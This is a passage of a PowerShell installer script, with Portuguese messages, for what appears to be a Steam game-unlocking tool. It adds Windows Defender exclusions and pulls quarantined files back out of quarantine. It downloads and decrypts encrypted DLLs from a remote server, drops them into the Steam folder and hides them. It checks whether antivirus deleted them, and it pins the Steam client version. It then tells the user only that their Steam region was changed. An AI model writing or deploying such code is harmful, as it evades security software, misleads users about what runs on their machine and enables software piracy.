      foreach ($prop in $game.manifestHeaders.PSObject.Properties) {
        $headers[$prop.Name] = [string]$prop.Value
      }
    }

    $tmpZip = Join-Path $env:TEMP ("sk-installed-{0}-{1}.zip" -f $appId, [guid]::NewGuid().ToString('N'))
    try {
      if (-not (Download-ManifestArchive -Url $manifestUrl -OutFile $tmpZip -Headers $headers)) {
        Write-InstalledLog -SteamRoot $SteamRoot -Message ("[$appId] download falhou")
        continue
      }
      if (-not (Install-ManifestLuaFromZip -SteamRoot $SteamRoot -AppId $appId -ArchivePath $tmpZip)) {
        Write-InstalledLog -SteamRoot $SteamRoot -Message ("[$appId] extract falhou")
        continue
      }
      $serverVersion = $null
      if ($game.manifestVersion -ne $null) { $serverVersion = [int64]$game.manifestVersion }
      if ($sync -and $sync.game -and $sync.game.manifestVersion -ne $null) {
        $serverVersion = [int64]$sync.game.manifestVersion
      }
      if ($serverVersion -gt 0) {
        Set-LocalManifestVersion -SteamRoot $SteamRoot -AppId $appId -Version $serverVersion | Out-Null
      }
      $fixed++
      Write-InstalledLog -SteamRoot $SteamRoot -Message ("[$appId] lua instalado")
    } finally {
      if (Test-Path -LiteralPath $tmpZip) {
        Remove-Item -LiteralPath $tmpZip -Force -ErrorAction SilentlyContinue
      }
    }
  }

  Write-InstalledLog -SteamRoot $SteamRoot -Message ('concluido corrigidos=' + $fixed)
  return $fixed
}


  

  

  function Assert-FileSurvived([string]$Path, [int]$MaxWaitMs = 5000) {
    if (-not (Test-Path $Path)) { return $false }
    $elapsed = 0
    while ($elapsed -lt $MaxWaitMs) {
      Start-Sleep -Milliseconds 300
      $elapsed += 300
      if (-not (Test-Path $Path)) {
        $restored = Restore-DefenderQuarantineSafe (Split-Path $Path -Parent)
        if ($restored -gt 0) {
          Start-Sleep -Milliseconds 1000
          if (Test-Path $Path) { return $true }
        }
        return $false
      }
      if ($elapsed -ge 600) { return $true }
    }
    return (Test-Path $Path)
  }

  function Remove-LegacyMillenniumComponents([string]$SteamRoot) {
    $milLocalApp = Join-Path $env:LOCALAPPDATA "Millennium"
    foreach ($f in @("wsock32.dll", "version.dll", "millennium.hhx64.dll", "millennium.dll", "python311.dll")) {
      $p = Join-Path $SteamRoot $f
      if (Test-Path $p) { try { Remove-Item $p -Force -ErrorAction SilentlyContinue } catch {} }
    }
    foreach ($dir in @("millennium", "plugins")) {
      $p = Join-Path $SteamRoot $dir
      if (Test-Path $p) { try { Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue } catch {} }
    }
    if (Test-Path $milLocalApp) { try { Remove-Item $milLocalApp -Recurse -Force -ErrorAction SilentlyContinue } catch {} }
  }

  Step 8 "Preparando..."
  Stop-SteamFully
  if ($recoverMode) {
    Step 10 "Aguardando bibliotecas..."
    $null = Wait-SteamLibraryDrives -SteamRoot $steam -TimeoutSec 90
  }
  Add-DefenderExclusionsForSteam $steam | Out-Null
  Restore-DefenderQuarantineSafe $steam | Out-Null

  Step 12 "Removendo componentes legados..."
  $null = Invoke-SkOstLegacyMigrationCleanup $steam
  Remove-LegacyMillenniumComponents $steam

  $luaDirCheck = Join-Path $steam "config\lua"
  $luaCountAfterCleanup = 0
  if (Test-Path -LiteralPath $luaDirCheck) {
    $luaCountAfterCleanup = @(Get-ChildItem -LiteralPath $luaDirCheck -Filter "*.lua" -File -ErrorAction SilentlyContinue).Count
  }
  $script:SkDeferFullLuaRestore = ($luaCountAfterCleanup -lt 10)

  Step 14 "Verificando cliente Steam..."
  [void](Ensure-SteamClientBootstrap $steam)

  Step 20 "Baixando componentes..."
  Stop-SteamFully
  $ostTotal = $ostFiles.Count
  $ostIndex = 0
  foreach ($entry in $ostFiles) {
    $ostIndex++
    $stepPct = 20 + [int](($ostIndex / [math]::Max($ostTotal, 1)) * 40)
    Step $stepPct "Baixando componentes..."
    $dst = Join-Path $steam $entry.Name
    if ($skipOstDllIfHashMatch -and (Test-Path -LiteralPath $dst)) {
      $existingSha = Get-Sha256 $dst
      if ($existingSha -and ($existingSha.ToUpper() -eq $entry.Sha.ToUpper())) {
        Set-FileHidden $dst
        continue
      }
    }
    $encUrl = $ostPayloadBaseUrl.TrimEnd('/') + '/' + $entry.EncFile + '?v=' + $ostReleaseNorm
    $tmpEnc = Get-TmpPath ".enc"
    $tmpDll = Get-TmpPath ".dll"
    try {
      if (-not (Download-File $encUrl $tmpEnc)) { Fail "dl" }
      try {
        Decrypt-SkOstPayloadFile $tmpEnc $ostReleaseNorm $tmpDll
      } catch {
        Fail "dec"
      }
      $got = Get-Sha256 $tmpDll
      if (-not $got -or ($got.ToUpper() -ne $entry.Sha.ToUpper())) { Fail "hash" }
      if (-not (Test-PeFile $tmpDll)) { Fail "pe" }
      Stop-SteamFully
      if (-not (Copy-IntoSteamRoot $tmpDll $dst)) { Fail "copy" }
      if (-not (Assert-FileSurvived $dst)) { Fail "av" }
      Set-FileHidden $dst
    } finally {
      if (Test-Path $tmpEnc) { Remove-Item $tmpEnc -Force -ErrorAction SilentlyContinue }
      if (Test-Path $tmpDll) { Remove-Item $tmpDll -Force -ErrorAction SilentlyContinue }
    }
  }

  Step 65 "Preparando Steam..."
  [void](Ensure-SteamClientPin $steam)

  Step 70 "Configurando ambiente..."
  $legacyApiBase = Join-Path $steam "opensteamtool\api-base.txt"
  if (Test-Path $legacyApiBase) {
    try { Remove-Item $legacyApiBase -Force -ErrorAction SilentlyContinue } catch {}
  }
  try {
    Set-Content -Path $legacyApiBase -Value $fallbackDllBase.TrimEnd('/') -Encoding ASCII -NoNewline -ErrorAction Stop
  } catch {}

  $ostDir = Join-Path $steam "opensteamtool"
  if (-not (Test-Path $ostDir)) {
    New-Item -Path $ostDir -ItemType Directory -Force | Out-Null
  }
  Set-FileHidden $ostDir

  $tomlPath = Join-Path $steam "opensteamtool.toml"
  $luaRel = "config/lua"
  if ($recoverMode) {
    $tomlContent = '[lua]' + [Environment]::NewLine +
      'paths = ["' + $luaRel + '"]' + [Environment]::NewLine
  } else {
    $stplugRel = "config/stplug-in"
    $tomlContent = '[lua]' + [Environment]::NewLine +
      'paths = ["' + $stplugRel + '", "' + $luaRel + '"]' + [Environment]::NewLine
  }
  try {
    Write-Utf8NoBom $tomlPath $tomlContent
  } catch {}

  $stplugDir = Join-Path $steam "config\stplug-in"
  $luaDir = Join-Path $steam "config\lua"
  if (-not (Test-Path $stplugDir)) { New-Item -Path $stplugDir -ItemType Directory -Force | Out-Null }
  if (-not (Test-Path $luaDir)) { New-Item -Path $luaDir -ItemType Directory -Force | Out-Null }
  if ($recoverMode) {
    Remove-StplugInLuaDuplicates -SteamRoot $steam | Out-Null
  }

  $ostMarker = Join-Path $steam ".sk-ost-version"
  try { Set-Content -Path $ostMarker -Value $ostReleaseNorm -Encoding ASCII -ErrorAction SilentlyContinue } catch {}
  $channelMarker = Join-Path $ostDir ".sk-ost-channel"
  try { Set-Content -Path $channelMarker -Value $ostChannel -Encoding ASCII -ErrorAction SilentlyContinue } catch {}

  [void](Ensure-SteamCloudDisabledAll $steam)
  [void](Repair-SteamUiIndexHtml $steam)
  try {
    if ($script:SkTmp -and ($script:SkTmp -like (Join-Path $steam '*')) -and (Test-Path $script:SkTmp)) {
      Remove-Item $script:SkTmp -Recurse -Force -ErrorAction SilentlyContinue
    }
  } catch {}

  Step 78 "Preparando jogos instalados..."
  try {
    Remove-BypassRepairArtifacts -SteamRoot $steam
    if ($recoverMode) {
      $catalogGames = Get-SkRecoverCatalog -SteamRoot $steam
      $repairResult = Invoke-RecoverLibraryRepair -SteamRoot $steam -CatalogGames $catalogGames
      $catalogResult = Install-SkRecoverLuas -SteamRoot $steam -CatalogGames $catalogGames
      Write-RecoverLog -SteamRoot $steam -Message ("library libs=" + $repairResult.libraries + " manifests=" + $repairResult.manifests + " lua=" + $catalogResult.installed)
      Remove-LuaRepairArtifacts -SteamRoot $steam
    } elseif ($runInstalledLuaRepair) {
      Remove-LuaRepairArtifacts -SteamRoot $steam
      Repair-InstalledMissingLuas -SteamRoot $steam | Out-Null
      if ($script:SkDeferFullLuaRestore) {
        Start-LuaRepairBackground -SteamRoot $steam
      }
    } elseif ($enableLuaRepairSchedule) {
      Start-LuaRepairBackground -SteamRoot $steam
    } else {
      Remove-LuaRepairArtifacts -SteamRoot $steam
    }
  } catch {}

  Step 88 "Finalizando..."
  Stop-SteamFully
  [void](Ensure-SteamClientPin $steam)
  [void](Clear-SteamBootstrapPending $steam)
  if (-not (Test-SteamClientDllsHealthy $steam)) {
    Fail "steamui.dll invalido — restaure pelo backup .sk-bak ou renomeie steam.cfg e abra a Steam uma vez"
  }

  try {
    $htmlCache = Join-Path $env:LOCALAPPDATA "Steam\htmlcache"
    if (Test-Path -LiteralPath $htmlCache) {
      Remove-Item -LiteralPath $htmlCache -Recurse -Force -ErrorAction SilentlyContinue
    }
  } catch {}

  [void](Ensure-SteamClientBootstrap $steam)

  Step 100 "Concluido"
  Step-NewLine
  Write-Host ""
  Write-Host "  [ OK ] " -ForegroundColor Green -NoNewline
  Write-Host "Regiao da Steam alterada." -ForegroundColor Gray
  Write-Host ""

  if ($recoverMode) {
    $ostReady = Start-SteamRecover $steam
    if (-not $ostReady) {
      Write-Host "  AVISO: sk-ost ready nao detectado. Aguarde 1 minuto antes de JOGAR." -ForegroundColor Yellow
    }
  } else {
    try { Start-SteamAfterInstall $steam } catch {}
  }

  Start-Sleep -Seconds 2
  exit 0
} catch {
  Fail $_.Exception.Message
}
